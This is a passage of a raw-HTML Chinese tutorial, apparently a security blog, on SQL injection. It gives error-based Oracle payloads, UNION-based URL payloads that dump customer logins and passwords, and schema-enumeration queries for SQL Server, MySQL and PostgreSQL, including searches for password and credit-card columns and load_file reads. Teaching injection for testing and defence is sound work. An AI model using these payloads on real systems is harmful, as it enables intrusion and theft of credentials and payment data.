AWXML.AWException: oracle.AWXML.AWException: An error has occurred, on the server
Error class: Express Failure
Server error descriptions:
ENG: ORA-34344: Analytic workspace VICTIMUSER is not attached.
&lt;span class=&#34;token comment&#34;&gt;#注入下列内容：&lt;/span&gt;
Or &lt;span class=&#34;token assign-left variable&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; CTXSYS.CTX_QUERY.CHK_XPATH&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;user,&lt;span class=&#34;token string&#34;&gt;&#39;a&#39;&lt;/span&gt;,&lt;span class=&#34;token string&#34;&gt;&#39;b&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;--
返回下列内容：
ORA-20000: Oracle Text error:
DRG-11701: thesaurus VICTIMUSER does not exist
ORA-06512: at &lt;span class=&#34;token string&#34;&gt;&#34;CTXSYS.DRUE&#34;&lt;/span&gt;, line &lt;span class=&#34;token number&#34;&gt;160&lt;/span&gt;
ORA-06512: at &lt;span class=&#34;token string&#34;&gt;&#34;CTXSYS.DRITHSX&#34;&lt;/span&gt;, line &lt;span class=&#34;token number&#34;&gt;538&lt;/span&gt;
ORA-06512: at line &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;枚举数据库模式&#34;&gt;&lt;a href=&#34;#枚举数据库模式&#34; class=&#34;headerlink&#34; title=&#34;枚举数据库模式&#34;&gt;&lt;/a&gt;枚举数据库模式&lt;/h3&gt;&lt;p&gt;在拥有权限的前提下，将所有元数据全部枚举出来&lt;/p&gt;
&lt;h4 id=&#34;SQL-Server&#34;&gt;&lt;a href=&#34;#SQL-Server&#34; class=&#34;headerlink&#34; title=&#34;SQL Server&#34;&gt;&lt;/a&gt;SQL Server&lt;/h4&gt;&lt;p&gt;有一个返回指定商品的详细信息的页面&lt;code&gt;http://test&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;返回数据表列表&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;http:&lt;span class=&#34;token comment&#34;&gt;//test?id=12+union+select+null,name,null,null+from+master..sysdatabases&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;master数据库包含了其他数据库的元数据，如master..sysdatabases可以检索出数据库名称列表&lt;/p&gt;
&lt;p&gt;e-shop数据库包含了电子商务应用使用的所有数据。&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; db_name&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;-- 正在使用的数据库名称&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;枚举表名，每个数据都有一个名为&lt;code&gt;sysobjects&lt;/code&gt;的表，假如想要检索e-shop数据库的表名&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; name &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; e&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;shop&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sysobjects &lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; xtype&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;U&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;得到表名，枚举列名，以customers表为例&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; name &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; e&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;shop&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;syscolumns &lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; id &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; id &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; e&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;shop&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sysobjects &lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; name &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;customers&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这句SQL用的是镶嵌查询，先用里面的查出customers表的id，再通过id指定表查列名，也能使用连接查询&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; a&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;name &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; e&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;shop&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;syscolumns a&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;e_shop&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sysobjects b &lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt;
b&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;name &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;customers&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;AND&lt;/span&gt; a&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;id &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; b&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;id&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;知道了列名，可以开始枚举字段，爆数据了，数据类型的检验前面说过&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;http:&lt;span class=&#34;token comment&#34;&gt;//test?id=12+union+select+null,login,password, null+from+e-shop..Customers-- &lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;防暴力破解scrypt算法&lt;/p&gt;
&lt;h4 id=&#34;Mysql&#34;&gt;&lt;a href=&#34;#Mysql&#34; class=&#34;headerlink&#34; title=&#34;Mysql&#34;&gt;&lt;/a&gt;Mysql&lt;/h4&gt;&lt;p&gt;提取数据库名称, 然后转向表、列，最后是数据本身。&lt;/p&gt;
&lt;p&gt;检索用户&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; current_users&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;没有管理员权限，大于5.0的版本能用information_schema，获取数据库名列表&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;schema&lt;/span&gt; form information_schema&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;schemata&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;枚举表名，库名customers_db&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; table_schema&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;table_name &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; information_schema&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;tables&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; table_schema&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;customers_db&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;枚举所有表名&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; table_schema&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;table_name &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; information_schema&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;tables&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; table_schema &lt;span class=&#34;token operator&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;mysql&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;AND&lt;/span&gt; table_schema &lt;span class=&#34;token operator&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;information_schema&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;检索列&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; table_schema&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;table_name&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;column_name &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; information_schema&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;columns&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; table_name&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;test&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;全部列&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; table_schema&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;table_name&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;column_name &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; information_schema&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;columns&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; table_schema &lt;span class=&#34;token operator&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;mysql&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;AND&lt;/span&gt; table_schema &lt;span class=&#34;token operator&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;information_schema&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这样就可以爆出数据库全部内容，当然你能加一些限制条件，找到你需要的数据&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; table_schema&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;table_name&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;column_name &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; information_schema&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;columns&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; column_name &lt;span class=&#34;token operator&#34;&gt;LIKE&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;password&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;OR&lt;/span&gt; column_name &lt;span class=&#34;token operator&#34;&gt;LIKE&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;credit_card&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;查询用户授权信息&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; grantee&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;privilege_type&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;is_grantable &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; information_schema&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;user_privileges&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;5.0之前的数据库&lt;/p&gt;
&lt;p&gt;先访问存储目标数据库的文件，将其原始内容导入到我们创建的一张表中，然后使用前面介绍的技术提取该表。&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;database&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;数据库的文件保存在与数据库名称相同的目录下。此目录包含在主MySQL数据目录中，可使用下列查询来返回该目录：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; @&lt;span class=&#34;token variable&#34;&gt;@datadir&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;数据库的所有表包含在一个扩展名为MYD的文件中。例如，下面是数据库默认的 一些MYD文件：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-bash&#34; data-language=&#34;bash&#34;&gt;&lt;code class=&#34;language-bash&#34;&gt;tables_priv.MYD
host.MYD
help_keyword.MYD
columns_priv.MYD
db.MYD&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;可使用下列查询提取该数据库中特定表的内容：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; load_file&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;databasename/tablename.MYD&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;要是没有information_schema,就必须先暴力破解表名后才能成功执行该查询。load_file允许检索的字节数有个最大值，该值由&lt;code&gt;@@max_allowed_packet&lt;/code&gt; 变量指定。所以该技术不适用于存储了大量数据的表。&lt;/p&gt;
&lt;h4 id=&#34;PostgreSQL-1&#34;&gt;&lt;a href=&#34;#PostgreSQL-1&#34; class=&#34;headerlink&#34; title=&#34;PostgreSQL&#34;&gt;&lt;/a&gt;PostgreSQL&lt;/h4&gt;&lt;p&gt;检索所有数据库&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; datname &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; pg_database&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;查找当前数据库&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; current_database&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;检索数据库用户列表&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; usename &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; pg_user&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;查询当前用户&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;current_user&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;session_user&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; getpgusername&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;session_user返回启动当前数据库连接的用户，而current_user和user(二者是等价的)则返回当前执行上下文的用户，即返回用于检查许可权限的那个用户账号。除非在某处调用了 SET ROLE指令，否则二者通常返回相同的值。对于最后一条语句，getpgusername()将返回与当前线程关联的用户。&lt;/p&gt;
&lt;p&gt;枚举所有模式中的全部表&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; c&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;relname &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; pg_catalog&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;pg_class c &lt;span class=&#34;token keyword&#34;&gt;LEFT&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;JOIN&lt;/span&gt; pg_catalog&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;pg_namespace n &lt;span class=&#34;token keyword&#34;&gt;ON&lt;/span&gt; n&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;oid &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; c&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;relnamespace &lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; c&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;relkind &lt;span class=&#34;token operator&#34;&gt;IN&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;r&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;AND&lt;/span&gt; n&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;nspname &lt;span class=&#34;token operator&#34;&gt;NOT&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;IN&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;pg_catalog&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;pg_toast&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;AND&lt;/span&gt; pg_catalog&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;pg_table_is_visible&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;c&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;oid&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; tablename &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; pg_tables &lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; tablename &lt;span class=&#34;token operator&#34;&gt;NOT&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;LIKE&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;pg_%&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;AND&lt;/span&gt; tablename &lt;span class=&#34;token operator&#34;&gt;NOT&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;LIKE&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;sql_%&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;所有列(public下的)&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; relname&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;A&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;attname &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; pg_class C&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;pg_namespace N&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;pg_attribute A&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;pg_type T &lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;C&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;relkind&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;r&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;AND&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;N&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;oid&lt;span 